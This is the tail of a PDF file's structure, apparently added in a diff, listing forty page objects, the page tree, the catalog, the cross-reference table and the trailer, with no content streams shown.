+57 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 17 0 R >>
+endobj
+58 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 18 0 R >>
+endobj
+59 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 19 0 R >>
+endobj
+60 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 20 0 R >>
+endobj
+61 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 21 0 R >>
+endobj
+62 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 22 0 R >>
+endobj
+63 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 23 0 R >>
+endobj
+64 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 24 0 R >>
+endobj
+65 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 25 0 R >>
+endobj
+66 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 26 0 R >>
+endobj
+67 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 27 0 R >>
+endobj
+68 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 28 0 R >>
+endobj
+69 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 29 0 R >>
+endobj
+70 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 30 0 R >>
+endobj
+71 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 31 0 R >>
+endobj
+72 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 32 0 R >>
+endobj
+73 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 33 0 R >>
+endobj
+74 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 34 0 R >>
+endobj
+75 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 35 0 R >>
+endobj
+76 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 36 0 R >>
+endobj
+77 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 37 0 R >>
+endobj
+78 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 38 0 R >>
+endobj
+79 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 39 0 R >>
+endobj
+80 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 40 0 R >>
+endobj
+81 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 41 0 R >>
+endobj
+82 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 42 0 R >>
+endobj
+83 0 obj
+<< /Type /Page /Parent 84 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 1 0 R /F2 2 0 R /F3 3 0 R >> >> /Contents 43 0 R >>
+endobj
+84 0 obj
+<< /Type /Pages /Count 40 /Kids [44 0 R 45 0 R 46 0 R 47 0 R 48 0 R 49 0 R 50 0 R 51 0 R 52 0 R 53 0 R 54 0 R 55 0 R 56 0 R 57 0 R 58 0 R 59 0 R 60 0 R 61 0 R 62 0 R 63 0 R 64 0 R 65 0 R 66 0 R 67 0 R 68 0 R 69 0 R 70 0 R 71 0 R 72 0 R 73 0 R 74 0 R 75 0 R 76 0 R 77 0 R 78 0 R 79 0 R 80 0 R 81 0 R 82 0 R 83 0 R] >>
+endobj
+85 0 obj
+<< /Type /Catalog /Pages 84 0 R >>
+endobj
+xref
+0 86
+0000000000 65535 f 
+0000000015 00000 n 
+0000000085 00000 n 
+0000000160 00000 n 
+0000000228 00000 n 
+0000003624 00000 n 
+0000007151 00000 n 
+0000010907 00000 n 
+0000014357 00000 n 
+0000018313 00000 n 
+0000022504 00000 n 
+0000025682 00000 n 
+0000029517 00000 n 
+0000032983 00000 n 
+0000036534 00000 n 
+0000039842 00000 n 
+0000043219 00000 n 
+0000047048 00000 n 
+0000050501 00000 n 
+0000054193 00000 n 
+0000057787 00000 n 
+0000061259 00000 n 
+0000064785 00000 n 
+0000068293 00000 n 
+0000071836 00000 n 
+0000075291 00000 n 
+0000078938 00000 n 
+0000082491 00000 n 
+0000085788 00000 n 
+0000089167 00000 n 
+0000092846 00000 n 
+0000096432 00000 n 
+0000100855 00000 n 
+0000104510 00000 n 
+0000108045 00000 n 
+0000111820 00000 n 
+0000115091 00000 n 
+0000118870 00000 n 
+0000122281 00000 n 
+0000125521 00000 n 
+0000128789 00000 n 
+0000132318 00000 n 
+0000136416 00000 n 
+0000140341 00000 n 
+0000143499 00000 n 
+0000143647 00000 n 
+0000143795 00000 n 
+0000143943 00000 n 
+0000144091 00000 n 
+0000144239 00000 n 
+0000144387 00000 n 
+0000144536 00000 n 
+0000144685 00000 n 
+0000144834 00000 n 
+0000144983 00000 n 
+0000145132 00000 n 
+0000145281 00000 n 
+0000145430 00000 n 
+0000145579 00000 n 
+0000145728 00000 n 
+0000145877 00000 n 
+0000146026 00000 n 
+0000146175 00000 n 
+0000146324 00000 n 
+0000146473 00000 n 
+0000146622 00000 n 
+0000146771 00000 n 
+0000146920 00000 n 
+0000147069 00000 n 
+0000147218 00000 n 
+0000147367 00000 n 
+0000147516 00000 n 
+0000147665 00000 n 
+0000147814 00000 n 
+0000147963 00000 n 
+0000148112 00000 n 
+0000148261 00000 n 
+0000148410 00000 n 
+0000148559 00000 n 
+0000148708 00000 n 
+0000148857 00000 n 
+0000149006 00000 n 
+0000149155 00000 n 
+0000149304 00000 n 
+0000149453 00000 n 
+0000149786 00000 n 
+trailer
+<< /Size 86 /Root 85 0 R >>
+startxref
+149837
+%%EOF
